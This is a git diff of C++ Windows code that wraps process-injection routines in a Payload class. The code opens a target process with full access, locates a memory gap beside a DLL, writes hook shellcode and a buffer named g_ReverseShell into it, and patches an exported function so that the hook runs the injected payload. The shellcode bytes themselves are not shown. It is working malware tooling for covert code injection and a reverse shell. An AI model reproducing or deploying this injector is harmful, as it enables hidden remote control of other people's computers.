@@ -2,9 +2,57 @@
 #include "utils/headers/CRTdefs.h"
 #include "intrin.h"
 #include <winternl.h>
+#include "utils/headers/Tools.h"
+
+Payload::Payload(DWORD process, API::API_ACCESS& api, const char* dll, const char* function)
+{
+	Tools tools;
+
+	ULONG_PTR uAddress = NULL;
+
+	HMODULE hModule = GetModuleHandleA(dll);
+
+	if (hModule == INVALID_HANDLE_VALUE)
+	{
+		MessageBoxA(NULL, "invalid module handle", "error", MB_ICONWARNING);
+		ExitProcess(-1);
+	}
+
+	FARPROC pFunctionToHook = GetProcAddress(hModule, function);
+
+	if (!pFunctionToHook)
+	{
+		MessageBoxA(NULL, "couldn't get address of function", "error", MB_ICONWARNING);
+		ExitProcess(-1);
+	}
+
+
+	PatchHook(pFunctionToHook);
+
+
+	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, process);
+
+	if (hProcess == INVALID_HANDLE_VALUE)
+		tools.ExitProgram("failed to get a handle to the process");
+
+	if (!LocateMemoryGap(hProcess, &uAddress, reinterpret_cast<ULONG_PTR>(pFunctionToHook), sizeof(g_ReverseShell) + sizeof(g_HookShellCode), api))
+		tools.ExitProgram("failed to find a memory gap");
+
+
+	if (!WritePayloadBuffer(hProcess, uAddress, (ULONG_PTR)g_HookShellCode, sizeof(g_HookShellCode), (ULONG_PTR)g_ReverseShell, sizeof(g_ReverseShell)))
+		tools.ExitProgram("failed to write payload buffer");
+
+
+	if (!InstallHook(hProcess, pFunctionToHook, reinterpret_cast<void*>(uAddress)))
+		tools.ExitProgram("failed to install hook");
+
+}
+
+
+
 
 // Locates a memory gap next to the DLL that exports the hooked function
-bool LocateMemoryGap(HANDLE hProcess, _Out_ ULONG_PTR* puAddress, uintptr_t pHookedFunction, size_t sPayloadSize, API::API_ACCESS& api) {
+bool Payload::LocateMemoryGap(HANDLE hProcess, _Out_ ULONG_PTR* puAddress, uintptr_t pHookedFunction, size_t sPayloadSize, API::API_ACCESS& api) {
 
 	NTSTATUS    status    = NULL;
 	ULONG_PTR   uAddress  = NULL;
@@ -32,7 +80,7 @@ bool LocateMemoryGap(HANDLE hProcess, _Out_ ULONG_PTR* puAddress, uintptr_t pHoo
 
 
 // This function redirects execution to the shellcode put into the memory gap, which uses a relative call instruction which requires an offset
-bool InstallHook(HANDLE hProcess, void *pExportedFunc, void* pMainPayloadAddress) 
+bool Payload::InstallHook(HANDLE hProcess, void *pExportedFunc, void* pMainPayloadAddress)
 {
 	NTSTATUS status		   = NULL;
 
@@ -128,7 +176,7 @@ start:
 */
 
 
-void PatchHook(void *pExportedFunc) {
+void Payload::PatchHook(void *pExportedFunc) {
 	// ullOriginalBytes is the first 8 bytes of the hooked function (before hooking)
 	unsigned long long uOriginalBytes = *(unsigned long long*)pExportedFunc;
 
@@ -136,7 +184,7 @@ void PatchHook(void *pExportedFunc) {
 	memcpy(&g_HookShellCode[22], &uOriginalBytes, sizeof(uOriginalBytes));
 }
 
-bool WritePayloadBuffer( HANDLE hProcess, ULONG_PTR uAddress, ULONG_PTR uHookShellcode, size_t sHookShellcodeSize, ULONG_PTR uPayloadBuffer, size_t sPayloadSize)
+bool Payload::WritePayloadBuffer( HANDLE hProcess, ULONG_PTR uAddress, ULONG_PTR uHookShellcode, size_t sHookShellcodeSize, ULONG_PTR uPayloadBuffer, size_t sPayloadSize)
 {
 
 	size_t		sTempSize		= sPayloadSize;
